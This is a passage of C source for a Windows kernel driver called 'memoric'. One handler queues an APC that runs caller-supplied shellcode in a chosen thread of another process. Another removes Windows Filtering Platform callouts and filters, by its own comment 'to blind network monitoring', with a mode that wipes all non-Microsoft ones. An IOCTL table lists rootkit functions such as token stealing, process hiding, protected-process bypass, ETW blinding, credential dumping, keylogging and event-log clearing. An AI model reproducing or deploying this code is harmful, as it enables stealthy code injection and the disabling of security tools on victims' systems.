                if (NT_SUCCESS(st)) {
                    PSYSTEM_PROCESS_INFO_APC cur = procInfo;
                    while (TRUE) {
                        if ((ULONG_PTR)cur->UniqueProcessId == reqCopy.ProcessId) {
                            ULONG_PTR bestTid = 0;
                            ULONG bestScore = 0; /* 0=none, 1=any, 2=waiting, 3=alertable-waiting */

                            for (ULONG t = 0; t < cur->NumberOfThreads; t++) {
                                ULONG_PTR tid = (ULONG_PTR)cur->Threads[t].ClientId.UniqueThread;
                                ULONG state = cur->Threads[t].ThreadState;
                                ULONG reason = cur->Threads[t].WaitReason;
                                LONG prio = cur->Threads[t].Priority;
                                ULONG score = 0;

                                /* Skip terminated threads */
                                if (state == 4) continue;
                                /* Skip real-time priority threads (>=16) — likely kernel workers */
                                if (prio >= 16) continue;

                                score = 1; /* any non-terminated, non-realtime thread */
                                if (state == 5) { /* Waiting */
                                    score = 2;
                                    /* Alertable wait reasons: DelayExecution, UserRequest, WrQueue */
                                    if (reason == 4 || reason == 6 || reason == 15) {
                                        score = 3;
                                    }
                                }
                                if (score > bestScore) {
                                    bestScore = score;
                                    bestTid = tid;
                                }
                                if (bestScore == 3) break; /* can't do better */
                            }

                            if (bestTid != 0) {
                                st = PsLookupThreadByThreadId((HANDLE)bestTid, &thread);
                                if (NT_SUCCESS(st)) {
                                    /* Final validation: ensure thread isn't terminating right now */
                                    if (PsIsThreadTerminating(thread)) {
                                        DbgPrint("[memoric] KernelAPC: TID %lu terminating, trying next\n",
                                                 (ULONG)bestTid);
                                        ObDereferenceObject(thread);
                                        thread = NULL;
                                        /* Try second-best: re-scan excluding this TID */
                                        {
                                            ULONG_PTR secondTid = 0;
                                            ULONG secondScore = 0;
                                            ULONG t2;
                                            for (t2 = 0; t2 < cur->NumberOfThreads; t2++) {
                                                ULONG_PTR tid2 = (ULONG_PTR)cur->Threads[t2].ClientId.UniqueThread;
                                                ULONG state2 = cur->Threads[t2].ThreadState;
                                                ULONG reason2 = cur->Threads[t2].WaitReason;
                                                LONG prio2 = cur->Threads[t2].Priority;
                                                ULONG sc2 = 0;
                                                if (tid2 == bestTid) continue;
                                                if (state2 == 4) continue;
                                                if (prio2 >= 16) continue;
                                                sc2 = 1;
                                                if (state2 == 5) {
                                                    sc2 = 2;
                                                    if (reason2 == 4 || reason2 == 6 || reason2 == 15)
                                                        sc2 = 3;
                                                }
                                                if (sc2 > secondScore) {
                                                    secondScore = sc2;
                                                    secondTid = tid2;
                                                }
                                            }
                                            if (secondTid != 0) {
                                                st = PsLookupThreadByThreadId((HANDLE)secondTid, &thread);
                                                if (NT_SUCCESS(st)) {
                                                    resp->ThreadId = (ULONG)secondTid;
                                                    DbgPrint("[memoric] KernelAPC: Fallback to TID %lu (score=%u)\n",
                                                             (ULONG)secondTid, secondScore);
                                                }
                                            }
                                        }
                                    } else {
                                        resp->ThreadId = (ULONG)bestTid;
                                        DbgPrint("[memoric] KernelAPC: Selected TID %lu (score=%u)\n",
                                                 (ULONG)bestTid, bestScore);
                                    }
                                }
                            }
                            break;
                        }
                        if (cur->NextEntryOffset == 0) break;
                        cur = (PSYSTEM_PROCESS_INFO_APC)((PUCHAR)cur + cur->NextEntryOffset);
                    }
                }
                ExFreePoolWithTag(procInfo, MEMORIC_POOL_TAG);
            }
        }
    }

    if (!thread) {
        ObDereferenceObject(process);
        resp->NtStatus = (ULONG64)STATUS_THREAD_NOT_IN_PROCESS;
        *bytesReturned = sizeof(MEMORIC_KERNEL_APC_RESPONSE);
        return STATUS_SUCCESS;
    }

    /* Allocate and initialize APC */
    {
        /* Resolve APC function pointers */
        if (!pfnKeInitializeApc || !pfnKeInsertQueueApc) {
            UNICODE_STRING fn1, fn2;
            RtlInitUnicodeString(&fn1, L"KeInitializeApc");
            RtlInitUnicodeString(&fn2, L"KeInsertQueueApc");
            pfnKeInitializeApc = (PFN_KeInitializeApc)MmGetSystemRoutineAddress(&fn1);
            pfnKeInsertQueueApc = (PFN_KeInsertQueueApc)MmGetSystemRoutineAddress(&fn2);
        }
        if (!pfnKeInitializeApc || !pfnKeInsertQueueApc) {
            ObDereferenceObject(thread);
            ObDereferenceObject(process);
            resp->NtStatus = (ULONG64)STATUS_INSUFFICIENT_RESOURCES;
            *bytesReturned = sizeof(MEMORIC_KERNEL_APC_RESPONSE);
            return STATUS_SUCCESS;
        }

        PKAPC apc = (PKAPC)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC), MEMORIC_POOL_TAG);
        if (!apc) {
            ObDereferenceObject(thread);
            ObDereferenceObject(process);
            resp->NtStatus = (ULONG64)STATUS_INSUFFICIENT_RESOURCES;
            *bytesReturned = sizeof(MEMORIC_KERNEL_APC_RESPONSE);
            return STATUS_SUCCESS;
        }

        pfnKeInitializeApc(
            apc,
            (PKTHREAD)thread,
            OriginalApcEnvironment,
            (PKKERNEL_ROUTINE)KernelApcKernelRoutine,
            (PKRUNDOWN_ROUTINE)KernelApcRundownRoutine,
            (PKNORMAL_ROUTINE)(ULONG_PTR)reqCopy.ShellcodeAddr,
            UserMode,
            NULL
        );

        if (pfnKeInsertQueueApc(apc, NULL, NULL, 0)) {
            resp->Success = 1;
            resp->ApcAddr = (ULONG64)(ULONG_PTR)apc;
            resp->ThreadId = reqCopy.ThreadId != 0 ? reqCopy.ThreadId : resp->ThreadId;
            DbgPrint("[memoric] KernelAPC: Queued APC to TID %lu, shellcode=%p\n",
                     resp->ThreadId, (PVOID)(ULONG_PTR)reqCopy.ShellcodeAddr);

            /*
             * Alert the TARGET thread so it processes the user-mode APC.
             * KeTestAlertThread only works on the current thread.
             * Use KeAlertThread to wake the target from an alertable wait.
             */
            KeAlertThread((PKTHREAD)thread, UserMode);
        } else {
            ExFreePoolWithTag(apc, MEMORIC_POOL_TAG);
            resp->NtStatus = (ULONG64)STATUS_UNSUCCESSFUL;
            DbgPrint("[memoric] KernelAPC: KeInsertQueueApc failed\n");
        }
    }

    ObDereferenceObject(thread);
    ObDereferenceObject(process);
    *bytesReturned = sizeof(MEMORIC_KERNEL_APC_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * WFP (Windows Filtering Platform) Remove — Enumerate and remove
 * WFP callout objects to blind network monitoring.
 *
 * Uses proper WFP management APIs (FwpmCalloutEnum0) for enumeration
 * and FwpsCalloutUnregisterById0 for callout removal. All functions
 * dynamically resolved from NETIO.SYS via export table walking.
 * ---------------------------------------------------------------- */

static NTSTATUS HandleWfpRemove(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_WFP_REQUEST reqCopy;
    PMEMORIC_WFP_RESPONSE resp;
    NTSTATUS st;

    if (inputLength < sizeof(MEMORIC_WFP_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_WFP_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_WFP_REQUEST));
    resp = (PMEMORIC_WFP_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_WFP_RESPONSE));

    /*
     * Minimal WFP type definitions matching official WDK layout (fwpmtypes.h).
     * Defined locally to avoid requiring WFP headers.
     */
    typedef struct _WFP_DISPLAY_DATA_ {
        PWCHAR name;
        PWCHAR description;
    } WFP_DISPLAY_DATA_;

    typedef struct _WFP_BYTE_BLOB_ {
        UINT32 size;
        PUCHAR data;
    } WFP_BYTE_BLOB_;

    typedef struct _WFP_CALLOUT0_ {
        GUID            calloutKey;
        WFP_DISPLAY_DATA_ displayData;
        UINT32          flags;
        GUID           *providerKey;
        WFP_BYTE_BLOB_  providerData;
        GUID            applicableLayer;
        UINT32          calloutId;
    } WFP_CALLOUT0_;

    /* Function pointer types for WFP management/kernel APIs */
    typedef NTSTATUS (NTAPI *PFN_FwpmEngineOpen0)(
        const WCHAR*, UINT32, PVOID, PVOID, HANDLE*);
    typedef NTSTATUS (NTAPI *PFN_FwpmEngineClose0)(HANDLE);
    typedef NTSTATUS (NTAPI *PFN_FwpmCalloutCreateEnumHandle0)(
        HANDLE, PVOID, HANDLE*);
    typedef NTSTATUS (NTAPI *PFN_FwpmCalloutEnum0)(
        HANDLE, HANDLE, UINT32, WFP_CALLOUT0_***, UINT32*);
    typedef NTSTATUS (NTAPI *PFN_FwpmCalloutDestroyEnumHandle0)(
        HANDLE, HANDLE);
    typedef VOID (NTAPI *PFN_FwpmFreeMemory0)(PVOID*);
    typedef NTSTATUS (NTAPI *PFN_FwpsCalloutUnregisterById0)(UINT32);
    typedef NTSTATUS (NTAPI *PFN_FwpmCalloutDeleteById0)(HANDLE, UINT32);
    typedef NTSTATUS (NTAPI *PFN_FwpmFilterCreateEnumHandle0)(
        HANDLE, PVOID, HANDLE*);
    typedef NTSTATUS (NTAPI *PFN_FwpmFilterEnum0)(
        HANDLE, HANDLE, UINT32, PVOID*, UINT32*);
    typedef NTSTATUS (NTAPI *PFN_FwpmFilterDestroyEnumHandle0)(
        HANDLE, HANDLE);
    typedef NTSTATUS (NTAPI *PFN_FwpmFilterDeleteById0)(HANDLE, UINT64);
    typedef NTSTATUS (NTAPI *PFN_FwpmCalloutGetById0)(
        HANDLE, UINT32, WFP_CALLOUT0_**);

    /* Dynamically resolve WFP functions from NETIO.SYS */
    {
        PVOID netioBase = NULL;
        ULONG netioSize = 0;
        PFN_FwpmEngineOpen0               pOpen;
        PFN_FwpmEngineClose0              pClose;
        PFN_FwpmCalloutCreateEnumHandle0  pCreateEnum;
        PFN_FwpmCalloutEnum0              pCalloutEnum;
        PFN_FwpmCalloutDestroyEnumHandle0 pDestroyEnum;
        PFN_FwpmFreeMemory0               pFreeMemory;
        PFN_FwpsCalloutUnregisterById0    pUnregById;
        PFN_FwpmCalloutDeleteById0        pDeleteById;
        PFN_FwpmFilterCreateEnumHandle0   pFilterCreateEnum;
        PFN_FwpmFilterEnum0               pFilterEnum;
        PFN_FwpmFilterDestroyEnumHandle0  pFilterDestroyEnum;
        PFN_FwpmFilterDeleteById0         pFilterDeleteById;
        PFN_FwpmCalloutGetById0           pCalloutGetById;
        HANDLE engineHandle = NULL;

        st = FindKernelModule("NETIO.SYS", &netioBase, &netioSize);
        if (!NT_SUCCESS(st)) {
            DbgPrint("[memoric] WFP: NETIO.SYS not found\n");
            resp->Success = 0;
            *bytesReturned = sizeof(MEMORIC_WFP_RESPONSE);
            return STATUS_SUCCESS;
        }

        pOpen       = (PFN_FwpmEngineOpen0)EtwFindExportByName(netioBase, "FwpmEngineOpen0");
        pClose      = (PFN_FwpmEngineClose0)EtwFindExportByName(netioBase, "FwpmEngineClose0");
        pCreateEnum = (PFN_FwpmCalloutCreateEnumHandle0)EtwFindExportByName(netioBase, "FwpmCalloutCreateEnumHandle0");
        pCalloutEnum= (PFN_FwpmCalloutEnum0)EtwFindExportByName(netioBase, "FwpmCalloutEnum0");
        pDestroyEnum= (PFN_FwpmCalloutDestroyEnumHandle0)EtwFindExportByName(netioBase, "FwpmCalloutDestroyEnumHandle0");
        pFreeMemory = (PFN_FwpmFreeMemory0)EtwFindExportByName(netioBase, "FwpmFreeMemory0");
        pUnregById  = (PFN_FwpsCalloutUnregisterById0)EtwFindExportByName(netioBase, "FwpsCalloutUnregisterById0");
        pDeleteById = (PFN_FwpmCalloutDeleteById0)EtwFindExportByName(netioBase, "FwpmCalloutDeleteById0");
        pFilterCreateEnum = (PFN_FwpmFilterCreateEnumHandle0)EtwFindExportByName(netioBase, "FwpmFilterCreateEnumHandle0");
        pFilterEnum       = (PFN_FwpmFilterEnum0)EtwFindExportByName(netioBase, "FwpmFilterEnum0");
        pFilterDestroyEnum = (PFN_FwpmFilterDestroyEnumHandle0)EtwFindExportByName(netioBase, "FwpmFilterDestroyEnumHandle0");
        pFilterDeleteById = (PFN_FwpmFilterDeleteById0)EtwFindExportByName(netioBase, "FwpmFilterDeleteById0");
        pCalloutGetById   = (PFN_FwpmCalloutGetById0)EtwFindExportByName(netioBase, "FwpmCalloutGetById0");

        if (!pOpen || !pClose || !pCreateEnum || !pCalloutEnum || !pDestroyEnum || !pFreeMemory) {
            DbgPrint("[memoric] WFP: Cannot resolve FWPM functions from NETIO.SYS\n");
            resp->Success = 0;
            *bytesReturned = sizeof(MEMORIC_WFP_RESPONSE);
            return STATUS_SUCCESS;
        }

        /* Open the Base Filtering Engine (BFE) */
        st = pOpen(NULL, 10 /* RPC_C_AUTHN_WINNT */, NULL, NULL, &engineHandle);
        if (!NT_SUCCESS(st) || !engineHandle) {
            DbgPrint("[memoric] WFP: FwpmEngineOpen0 failed: 0x%08X\n", st);
            resp->Success = 0;
            *bytesReturned = sizeof(MEMORIC_WFP_RESPONSE);
            return STATUS_SUCCESS;
        }

        switch (reqCopy.Action) {
        case MEMORIC_WFP_ENUM: {
            /*
             * Enumerate all registered WFP callouts via the management API.
             * This returns structured data including display name, callout key,
             * applicable layer GUID, and callout ID.
             */
            HANDLE enumHandle = NULL;
            WFP_CALLOUT0_ **callouts = NULL;
            UINT32 numCallouts = 0;
            ULONG found = 0;

            st = pCreateEnum(engineHandle, NULL, &enumHandle);
            if (!NT_SUCCESS(st)) {
                DbgPrint("[memoric] WFP ENUM: CreateEnumHandle failed: 0x%08X\n", st);
                break;
            }

            st = pCalloutEnum(engineHandle, enumHandle, 0xFFFFFFFF, &callouts, &numCallouts);
            if (NT_SUCCESS(st) && callouts) {
                UINT32 ci;
                for (ci = 0; ci < numCallouts && found < 32; ci++) {
                    WFP_CALLOUT0_ *c = callouts[ci];
                    if (!c) continue;

                    resp->Entries[found].CalloutId = (ULONG64)c->calloutId;
                    resp->Entries[found].LayerId = *(PULONG)&c->applicableLayer;
                    resp->Entries[found].Active = 1;
                    resp->Entries[found].FunctionAddr = 0;

                    if (c->displayData.name) {
                        __try {
                            ULONG k;
                            for (k = 0; k < 63 && c->displayData.name[k]; k++)
                                resp->Entries[found].ProviderName[k] = c->displayData.name[k];
                            resp->Entries[found].ProviderName[k] = L'\0';
                        } __except (EXCEPTION_EXECUTE_HANDLER) {
                            resp->Entries[found].ProviderName[0] = L'\0';
                        }
                    }
                    found++;
                }
                pFreeMemory((PVOID*)&callouts);
            }

            pDestroyEnum(engineHandle, enumHandle);
            resp->TotalCallouts = numCallouts;
            resp->Success = 1;
            DbgPrint("[memoric] WFP ENUM: %lu total callouts, returned %lu\n", numCallouts, found);
            break;
        }

        case MEMORIC_WFP_REMOVE:
        case MEMORIC_WFP_NUKE: {
            /*
             * Remove WFP callouts:
             * - REMOVE + CalloutId: unregister specific callout by ID
             * - REMOVE + ProviderName: enumerate and unregister matching callouts
             * - NUKE: enumerate and unregister all non-system callouts
             *
             * Two-step removal (management-first order):
             *   1. FwpmCalloutDeleteById0 — management-plane delete FIRST
             *      Removes the callout object from BFE, preventing new flows
             *      from being associated with this callout. This is critical
             *      for avoiding perpetual STATUS_DEVICE_BUSY on step 2.
             *   2. FwpsCalloutUnregisterById0 — kernel-side unregister
             *      Stops the classify function from being called for any
             *      remaining in-flight flows.
             *
             * STATUS_DEVICE_BUSY handling: per MS docs (FwpsCalloutUnregisterById0),
             * this means "there are one or more data flows being processed by the
             * callout's classifyFn". We mitigate by:
             *   a) Doing management delete first (stops new flow associations)
             *   b) On first DEVICE_BUSY, enumerating all WFP filters and deleting
             *      those whose action references this callout. This actively removes
             *      the source of new flows rather than just waiting.
             *   c) Retrying kernel unregister with exponential backoff (up to ~2s)
             *      to let existing flows drain naturally
             */
            ULONG removed = 0;
            #define WFP_UNREGISTER_RETRIES 12
            #define WFP_RETRY_DELAY_BASE   (-5000LL) /* 500 microseconds relative */

            if (!pUnregById) {
                DbgPrint("[memoric] WFP: FwpsCalloutUnregisterById0 not available\n");
                break;
            }

            if (reqCopy.Action == MEMORIC_WFP_REMOVE && reqCopy.CalloutId != 0) {
                /* Direct removal by callout ID */
                __try {
                    ULONG retry;
                    /* Step 1: Management-plane delete FIRST — stop new flow associations */
                    if (pDeleteById) {
                        NTSTATUS mst = pDeleteById(engineHandle, (UINT32)reqCopy.CalloutId);
                        DbgPrint("[memoric] WFP REMOVE: FwpmCalloutDeleteById(%u) = 0x%08X\n",
                                 (UINT32)reqCopy.CalloutId, mst);
                    }
                    /* Step 2: Kernel unregister with exponential backoff */
                    st = STATUS_DEVICE_BUSY;
                    for (retry = 0; retry < WFP_UNREGISTER_RETRIES && st == STATUS_DEVICE_BUSY; retry++) {
                        st = pUnregById((UINT32)reqCopy.CalloutId);
                        if (st == STATUS_DEVICE_BUSY) {
                            /*
                             * On first DEVICE_BUSY, attempt to remove WFP filters
                             * that route traffic to this callout. This actively
                             * drains DEVICE_BUSY rather than just waiting.
                             */
                            if (retry == 0 && pFilterCreateEnum && pFilterEnum &&
                                pFilterDestroyEnum && pFilterDeleteById && pCalloutGetById) {
                                WFP_CALLOUT0_ *calloutObj = NULL;
                                NTSTATUS gst = pCalloutGetById(engineHandle,
                                    (UINT32)reqCopy.CalloutId, &calloutObj);
                                if (NT_SUCCESS(gst) && calloutObj) {
                                    GUID coKey;
                                    RtlCopyMemory(&coKey, &calloutObj->calloutKey, sizeof(GUID));
                                    pFreeMemory((PVOID*)&calloutObj);
                                    {
                                        HANDLE fEnum = NULL;
                                        gst = pFilterCreateEnum(engineHandle, NULL, &fEnum);
                                        if (NT_SUCCESS(gst) && fEnum) {
                                            PVOID fEntries = NULL;
                                            UINT32 nFilters = 0;
                                            gst = pFilterEnum(engineHandle, fEnum, 0xFFFFFFFF,
                                                              &fEntries, &nFilters);
                                            if (NT_SUCCESS(gst) && fEntries) {
                                                PVOID *fArr = (PVOID *)fEntries;
                                                UINT32 fDel = 0, fi;
                                                for (fi = 0; fi < nFilters; fi++) {
                                                    if (!fArr[fi]) continue;
                                                    __try {
                                                        PUCHAR raw = (PUCHAR)fArr[fi];
                                                        UINT32 aType = *(PULONG)(raw + 0x80);
                                                        if (aType & 0x4000) { /* FWP_ACTION_FLAG_CALLOUT */
                                                            GUID *aKey = (GUID *)(raw + 0x84);
                                                            if (RtlCompareMemory(aKey, &coKey, 16) == 16) {
                                                                UINT64 fId = *(PUINT64)(raw + 0xB0);
                                                                if (fId && NT_SUCCESS(pFilterDeleteById(
                                                                        engineHandle, fId)))
                                                                    fDel++;
                                                            }
                                                        }
                                                    } __except (EXCEPTION_EXECUTE_HANDLER) { }
                                                }
                                                pFreeMemory(&fEntries);
                                                if (fDel > 0)
                                                    DbgPrint("[memoric] WFP REMOVE: Cleaned up %u filters for callout %u\n",
                                                             fDel, (UINT32)reqCopy.CalloutId);
                                            }
                                            pFilterDestroyEnum(engineHandle, fEnum);
                                        }
                                    }
                                }
                            }
                            {
                                LARGE_INTEGER delay;
                                delay.QuadPart = WFP_RETRY_DELAY_BASE * (1LL << retry);
                                KeDelayExecutionThread(KernelMode, FALSE, &delay);
                            }
                        }
                    }
                    if (NT_SUCCESS(st)) {
                        removed++;
                        resp->Entries[0].CalloutId = reqCopy.CalloutId;
                        resp->Entries[0].Active = 0;
                        DbgPrint("[memoric] WFP REMOVE: callout ID %u fully removed\n",
                                 (UINT32)reqCopy.CalloutId);
                    } else {
                        resp->Entries[0].CalloutId = reqCopy.CalloutId;
                        resp->Entries[0].Active = 1;
                        DbgPrint("[memoric] WFP REMOVE: callout ID %u mgmt-deleted, kernel unregister=%s (0x%08X)\n",
                                 (UINT32)reqCopy.CalloutId,
                                 st == STATUS_DEVICE_BUSY ? "DEVICE_BUSY (flows pending)" : "failed",
                                 st);
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    DbgPrint("[memoric] WFP REMOVE: Exception unregistering callout %u\n",
                             (UINT32)reqCopy.CalloutId);
                }
            } else {
                /*
                 * Enumerate callouts and unregister matching ones.
                 * NUKE: remove all non-system callouts (skip names containing
                 *       "Windows", "Microsoft", "WFP", "TCP/IP", or empty names).
                 * REMOVE by name: remove callouts whose display name matches ProviderName.
                 */
                HANDLE enumHandle = NULL;
                WFP_CALLOUT0_ **callouts = NULL;
                UINT32 numCallouts = 0;

                st = pCreateEnum(engineHandle, NULL, &enumHandle);
                if (!NT_SUCCESS(st)) break;

                st = pCalloutEnum(engineHandle, enumHandle, 0xFFFFFFFF, &callouts, &numCallouts);
                if (NT_SUCCESS(st) && callouts) {
                    UINT32 ci;
                    for (ci = 0; ci < numCallouts; ci++) {
                        WFP_CALLOUT0_ *c = callouts[ci];
                        BOOLEAN shouldRemove = FALSE;
                        WCHAR nameW[64] = {0};

                        if (!c) continue;

                        if (c->displayData.name) {
                            __try {
                                ULONG k;
                                for (k = 0; k < 63 && c->displayData.name[k]; k++)
                                    nameW[k] = c->displayData.name[k];
                                nameW[k] = L'\0';
                            } __except (EXCEPTION_EXECUTE_HANDLER) {
                                nameW[0] = L'\0';
                            }
                        }

                        if (reqCopy.Action == MEMORIC_WFP_NUKE) {
                            /* Skip system/OS callouts */
                            if (nameW[0] == L'\0' ||
                                wcsstr(nameW, L"Windows") != NULL ||
                                wcsstr(nameW, L"Microsoft") != NULL ||
                                wcsstr(nameW, L"WFP") != NULL ||
                                wcsstr(nameW, L"TCP/IP") != NULL) {
                                continue;
                            }
                            shouldRemove = TRUE;
                        } else {
                            /* REMOVE by ProviderName substring match */
                            if (reqCopy.ProviderName[0] && wcsstr(nameW, reqCopy.ProviderName) != NULL)
                                shouldRemove = TRUE;
                        }

                        if (shouldRemove) {
                            __try {
                                ULONG retry;
                                /* Step 1: Management-plane delete FIRST */
                                if (pDeleteById) {
                                    pDeleteById(engineHandle, c->calloutId);
                                }
                                /* Step 2: Kernel unregister with backoff */
                                st = STATUS_DEVICE_BUSY;
                                for (retry = 0; retry < WFP_UNREGISTER_RETRIES && st == STATUS_DEVICE_BUSY; retry++) {
                                    st = pUnregById(c->calloutId);
                                    if (st == STATUS_DEVICE_BUSY) {
                                        /*
                                         * On first DEVICE_BUSY, delete WFP filters referencing
                                         * this callout to stop new traffic and help flows drain.
                                         */
                                        if (retry == 0 && pFilterCreateEnum && pFilterEnum &&
                                            pFilterDestroyEnum && pFilterDeleteById) {
                                            HANDLE fEnum2 = NULL;
                                            NTSTATUS fst = pFilterCreateEnum(engineHandle, NULL, &fEnum2);
                                            if (NT_SUCCESS(fst) && fEnum2) {
                                                PVOID fEntries2 = NULL;
                                                UINT32 nFilters2 = 0;
                                                fst = pFilterEnum(engineHandle, fEnum2, 0xFFFFFFFF,
                                                                  &fEntries2, &nFilters2);
                                                if (NT_SUCCESS(fst) && fEntries2) {
                                                    PVOID *fArr2 = (PVOID *)fEntries2;
                                                    UINT32 fDel2 = 0, fi2;
                                                    for (fi2 = 0; fi2 < nFilters2; fi2++) {
                                                        if (!fArr2[fi2]) continue;
                                                        __try {
                                                            PUCHAR raw2 = (PUCHAR)fArr2[fi2];
                                                            UINT32 aType2 = *(PULONG)(raw2 + 0x80);
                                                            if (aType2 & 0x4000) {
                                                                GUID *aKey2 = (GUID *)(raw2 + 0x84);
                                                                if (RtlCompareMemory(aKey2,
                                                                        &c->calloutKey, 16) == 16) {
                                                                    UINT64 fId2 = *(PUINT64)(raw2 + 0xB0);
                                                                    if (fId2 && NT_SUCCESS(pFilterDeleteById(
                                                                            engineHandle, fId2)))
                                                                        fDel2++;
                                                                }
                                                            }
                                                        } __except (EXCEPTION_EXECUTE_HANDLER) { }
                                                    }
                                                    pFreeMemory(&fEntries2);
                                                    if (fDel2 > 0)
                                                        DbgPrint("[memoric] WFP %s: Cleaned up %u filters for '%ls'\n",
                                                                 reqCopy.Action == MEMORIC_WFP_NUKE ? "NUKE" : "REMOVE",
                                                                 fDel2, nameW);
                                                }
                                                pFilterDestroyEnum(engineHandle, fEnum2);
                                            }
                                        }
                                        {
                                            LARGE_INTEGER delay;
                                            delay.QuadPart = WFP_RETRY_DELAY_BASE * (1LL << retry);
                                            KeDelayExecutionThread(KernelMode, FALSE, &delay);
                                        }
                                    }
                                }
                                if (NT_SUCCESS(st)) {
                                    if (removed < 32) {
                                        resp->Entries[removed].CalloutId = (ULONG64)c->calloutId;
                                        RtlCopyMemory(resp->Entries[removed].ProviderName, nameW, 128);
                                        resp->Entries[removed].LayerId = *(PULONG)&c->applicableLayer;
                                        resp->Entries[removed].Active = 0;
                                    }
                                    removed++;
                                    DbgPrint("[memoric] WFP %s: Removed '%ls' (ID %u)\n",
                                             reqCopy.Action == MEMORIC_WFP_NUKE ? "NUKE" : "REMOVE",
                                             nameW, c->calloutId);
                                } else if (st == STATUS_DEVICE_BUSY) {
                                    DbgPrint("[memoric] WFP %s: '%ls' (ID %u) mgmt-deleted but kernel DEVICE_BUSY after %d retries\n",
                                             reqCopy.Action == MEMORIC_WFP_NUKE ? "NUKE" : "REMOVE",
                                             nameW, c->calloutId, WFP_UNREGISTER_RETRIES);
                                }
                            } __except (EXCEPTION_EXECUTE_HANDLER) { }
                        }
                    }
                    pFreeMemory((PVOID*)&callouts);
                }

                pDestroyEnum(engineHandle, enumHandle);
                resp->TotalCallouts = numCallouts;
            }

            resp->RemovedCount = removed;
            resp->Success = (removed > 0) ? 1 : 0;
            break;
        }
        }

        pClose(engineHandle);
    }

    *bytesReturned = sizeof(MEMORIC_WFP_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Per-IOCTL Access Control — tiered privilege enforcement
 *
 * Three access tiers:
 *   READONLY  — information queries, safe to call with SeDebugPrivilege
 *   MODIFY    — alter process/thread/handle state, requires High integrity
 *   DESTRUCT  — irreversible/destructive ops, requires SYSTEM token
 *
 * SeDebugPrivilege is checked at device open time for all tiers.
 * Additional per-IOCTL checks happen here at dispatch time.
 * ================================================================ */

#define IOCTL_ACCESS_READONLY   0
#define IOCTL_ACCESS_MODIFY     1
#define IOCTL_ACCESS_DESTRUCT   2

static ULONG ClassifyIoctl(ULONG ioctl)
{
    switch (ioctl) {
    /* Read-only / enumeration / query */
    case IOCTL_MEMORIC_PHYS_READ:
    case IOCTL_MEMORIC_VIRT_READ:
    case IOCTL_MEMORIC_GET_CR3:
    case IOCTL_MEMORIC_GET_EPROCESS:
    case IOCTL_MEMORIC_VA_TO_PA:
    case IOCTL_MEMORIC_ENUM_PROCESS:
    case IOCTL_MEMORIC_CALLBACK_ENUM:
    case IOCTL_MEMORIC_PE_DUMP:
    case IOCTL_MEMORIC_DRIVER_STATS:
    case IOCTL_MEMORIC_MEMORY_POOL:
    case IOCTL_MEMORIC_MINIFILTER_ENUM:
    case IOCTL_MEMORIC_PROCESS_DUMP:
    case IOCTL_MEMORIC_HYPERVISOR_DETECT:
    case IOCTL_MEMORIC_GET_MODULE_BASE:
    case IOCTL_MEMORIC_CRED_DUMP:
    case IOCTL_MEMORIC_CAPABILITIES:
        return IOCTL_ACCESS_READONLY;

    /* Modify — alter state but generally reversible */
    case IOCTL_MEMORIC_PHYS_WRITE:
    case IOCTL_MEMORIC_VIRT_WRITE:
    case IOCTL_MEMORIC_TOKEN_STEAL:
    case IOCTL_MEMORIC_DKOM_HIDE:
    case IOCTL_MEMORIC_PPL_REMOVE:
    case IOCTL_MEMORIC_WRITE_KERNEL:
    case IOCTL_MEMORIC_MODULE_HIDE:
    case IOCTL_MEMORIC_THREAD_HIDE:
    case IOCTL_MEMORIC_CALLBACK_REMOVE:
    case IOCTL_MEMORIC_PATCH_KERNEL:
    case IOCTL_MEMORIC_APC_INJECT:
    case IOCTL_MEMORIC_HANDLE_STRIP:
    case IOCTL_MEMORIC_REG_PROTECT:
    case IOCTL_MEMORIC_NOTIFY_ROUTINE:
    case IOCTL_MEMORIC_SET_DEBUG_PORT:
    case IOCTL_MEMORIC_DPC_TIMER:
    case IOCTL_MEMORIC_PORT_HIDE:
    case IOCTL_MEMORIC_TOKEN_DUP:
    case IOCTL_MEMORIC_OBJECT_HOOK:
    case IOCTL_MEMORIC_TESTSIGN_HIDE:
    case IOCTL_MEMORIC_GLOBAL_HOOK:
    case IOCTL_MEMORIC_AUTO_INJECT:
    case IOCTL_MEMORIC_INFINITY_HOOK:
    case IOCTL_MEMORIC_PTE_RW:
    case IOCTL_MEMORIC_MSR_RW:
    case IOCTL_MEMORIC_CR_RW:
    case IOCTL_MEMORIC_IDT_RW:
    case IOCTL_MEMORIC_TOKEN_SWAP:
    case IOCTL_MEMORIC_PROCESS_PROTECT:
    case IOCTL_MEMORIC_REG_HIDE:
    case IOCTL_MEMORIC_FILE_LOCK:
    case IOCTL_MEMORIC_ETW_BLIND:
    case IOCTL_MEMORIC_EPROCESS_SPOOF:
    case IOCTL_MEMORIC_DRIVER_IMPERSONATE:
    case IOCTL_MEMORIC_PPL_BYPASS:
    case IOCTL_MEMORIC_KERNEL_APC_INJECT:
        return IOCTL_ACCESS_MODIFY;

    /* Destructive — irreversible, high-impact */
    case IOCTL_MEMORIC_CI_CALLBACK_PATCH:
    case IOCTL_MEMORIC_CI_FUNC_PATCH:
    case IOCTL_MEMORIC_DRIVER_CLOAK:
    case IOCTL_MEMORIC_FORCE_KILL:
    case IOCTL_MEMORIC_FORCE_DELETE:
    case IOCTL_MEMORIC_SYSTEM_THREAD:
    case IOCTL_MEMORIC_KERNEL_EXEC:
    case IOCTL_MEMORIC_UNLOADED_DRV_CLEAR:
    case IOCTL_MEMORIC_KEYLOGGER:
    case IOCTL_MEMORIC_EVENT_LOG_CLEAR:
    case IOCTL_MEMORIC_CALLBACK_NUKE:
    case IOCTL_MEMORIC_MINIFILTER_DETACH:
    case IOCTL_MEMORIC_WFP_REMOVE:
        return IOCTL_ACCESS_DESTRUCT;

    default:
        return IOCTL_ACCESS_DESTRUCT; /* unknown → highest restriction */
    }
}

static BOOLEAN IsCallerSystem(void)
{
    SECURITY_SUBJECT_CONTEXT subjectContext;
    PACCESS_TOKEN token;
